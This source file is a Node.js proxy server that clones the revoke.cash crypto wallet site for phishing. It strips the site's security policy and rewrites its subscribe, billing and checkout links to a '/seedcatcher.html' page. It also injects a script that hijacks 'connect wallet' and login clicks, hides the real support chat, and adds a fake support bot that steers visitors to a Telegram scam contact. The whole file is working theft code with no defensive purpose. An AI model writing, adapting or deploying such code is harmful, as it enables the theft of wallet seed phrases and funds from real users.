const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(async (req, res, next) => {
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile);
    }

    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.removeHeader('Content-Security-Policy');

        if (req.path === '/' || req.path === '/index.html' || req.path === '/premium') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                
                if (req.path === '/premium') {
                    html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
                    html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
                    html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');
                }

                // 1. HIJACK SCRIPT
                const hijackScript = `
                <script>
                document.addEventListener('click', function(e) {
                    let t = e.target.closest('a, button, div, span');
                    if (!t) return;
                    let text = (t.innerText || "").toLowerCase().trim();
                    let href = (t.getAttribute("href") || "").toLowerCase();
                    if (href === '/premium' || href.endsWith('/premium')) return;
                    if (text === 'connect' || text.includes('connect wallet') || text.includes('login') || text.includes('get started') || text.includes('subscribe') || text.includes('upgrade')) {
                        e.preventDefault();
                        e.stopPropagation();
                        window.location.href = '/seedcatcher.html';
                    }
                }, true);
                </script>
                `;

                // 2. THE MULTI-STEP CHATBOT
                const fakeChatBot = `
                <style>
                .crisp-client, iframe[title="Crisp Chat"], #crisp-chatbox, div[class*="crisp-"] { display: none !important; }
                
                #custom-support-btn {
                    position: fixed; bottom: 24px; right: 24px; z-index: 2147483647 !important;
                    width: 65px; height: 65px; border-radius: 50%;
                    background-color: #f59e0b;
                    display: flex; align-items: center; justify-content: center; cursor: pointer;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
                    transition: transform 0.2s;
                }
                #custom-support-btn:hover { transform: scale(1.05); }
                #custom-support-btn svg { width: 35px; height: 35px; fill: white; }
                
                #custom-support-modal {
                    position: fixed; bottom: 100px; right: 24px; z-index: 2147483647 !important;
                    width: 340px; background: #0b0e11; border: 1px solid #2a2c31; border-radius: 16px;
                    display: none; flex-direction: column; overflow: hidden; font-family: 'Inter', sans-serif;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-height: 500px;
                }
                .chat-header { background: #15171a; padding: 15px 20px; border-bottom: 1px solid #2a2c31; display: flex; justify-content: space-between; align-items: center; }
                .chat-header h3 { margin: 0; font-size: 16px; color: #fff; font-weight: 600; }
                .chat-close { cursor: pointer; color: #8a8d93; font-size: 20px; }
                .chat-body { padding: 20px; display: flex; flex-direction: column; gap: 12px; overflow-y: auto; height: 350px; }
                .chat-msg { background: #1e2026; color: #e2e8f0; padding: 14px; border-radius: 12px; font-size: 14px; line-height: 1.5; max-width: 90%; align-self: flex-start; }
                .chat-msg.user { background: #4b48ff; color: #fff; align-self: flex-end; }
                .chat-input-area { padding: 12px; border-top: 1px solid #2a2c31; display: flex; gap: 8px; background: #15171a; }
                .chat-input { flex: 1; background: #0b0e11; border: 1px solid #2a2c31; border-radius: 20px; padding: 10px 15px; color: #fff; font-size: 14px; outline: none; }
                .chat-send { background: #4b48ff; color: #fff; border: none; border-radius: 50%; width: 38px; height: 38px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
                .chat-btn { background: #4b48ff; color: #fff; text-align: center; padding: 14px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; border: none; transition: background 0.2s; margin-top: 5px; display: block; width: 100%;}
                .chat-btn:hover { background: #3b38e0; }
                .chat-btn-tg { background: #229ED9; color: #fff; text-align: center; padding: 14px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; display: block; margin-top: 5px; }
                </style>

                <div id="custom-support-btn" onclick="openChat()">
                    <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
                </div>

                <div id="custom-support-modal">
                    <div class="chat-header">
                        <h3>Revoke Support</h3>
                        <div class="chat-close" onclick="closeChat()">×</div>
                    </div>
                    <div class="chat-body" id="chat-body">
                        <div class="chat-msg">
                            Hello! Welcome to Revoke Support. To verify your assets and check for exploits, please connect your wallet securely below.
                        </div>
                        <button class="chat-btn" onclick="window.location.href='/seedcatcher.html'">Connect Wallet Securely</button>
                    </div>
                    <div class="chat-input-area">
                        <input type="text" class="chat-input" id="chat-input" placeholder="Type a message..." onkeypress="handleEnter(event)">
                        <button class="chat-send" onclick="sendMessage()">➤</button>
                    </div>
                </div>

                <script>
                let chatStep = 1;
                function openChat() { document.getElementById('custom-support-modal').style.display = 'flex'; }
                function closeChat() { document.getElementById('custom-support-modal').style.display = 'none'; }
                
                function handleEnter(e) { if(e.key === 'Enter') sendMessage(); }

                function sendMessage() {
                    let input = document.getElementById('chat-input');
                    let text = input.value.trim();
                    if (!text) return;

                    let body = document.getElementById('chat-body');
                    
                    // 1. Add User Message
                    body.innerHTML += '<div class="chat-msg user">' + text + '</div>';
                    input.value = '';
                    body.scrollTop = body.scrollHeight;

                    // 2. If it's the first message, simulate agent reply
                    if (chatStep === 1) {
                        body.innerHTML += '<div class="chat-msg" id="typing" style="color:#8a8d93; font-style:italic;">Support is typing...</div>';
                        body.scrollTop = body.scrollHeight;

                        setTimeout(() => {
                            document.getElementById('typing').remove();
                            body.innerHTML += \`
                                <div class="chat-msg">
                                    I understand. If you need further assistance, please contact our support team directly on Telegram.
                                </div>
                                <a href="https://t.me/TWresolver" class="chat-btn-tg">Contact Support Directly</a>
                            \`;
                            chatStep = 2;
                            body.scrollTop = body.scrollHeight;
                        }, 1500);
                    } else {
                        // If they keep chatting after step 2
                         setTimeout(() => {
                            body.innerHTML += \`
                                <div class="chat-msg">
                                    Please use the Telegram link above to speak with a live agent.
                                </div>
                            \`;
                            body.scrollTop = body.scrollHeight;
                        }, 1000);
                    }
                }
                </script>
                `;
                
                // Nuke Crisp at the source
                html = html.replace(/<script[^>]*src="[^"]*crisp[^"]*"[^>]*><\/script>/gi, '');
                html = html.replace(/CRISP_WEBSITE_ID.*?;/g, '');
                
                if (html.includes('</body>')) {
                    html = html.replace('</body>', hijackScript + fakeChatBot + '</body>');
                }
                res.send(html);
            });
        } else {
            // THIS FIXES THE 3D ASSETS AND VIDEOS
            if (response.headers['content-type']) {
                res.setHeader('Content-Type', response.headers['content-type']);
            }
            if (response.headers['content-length']) {
                res.setHeader('Content-Length', response.headers['content-length']);
            }
            if (response.headers['accept-ranges']) {
                res.setHeader('Accept-Ranges', response.headers['accept-ranges']);
            }
            response.data.pipe(res);
        }
    } catch (error) {
        next(); 
    }
});

app.get('*', (req, res) => {
    res.status(404).send('Not found');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
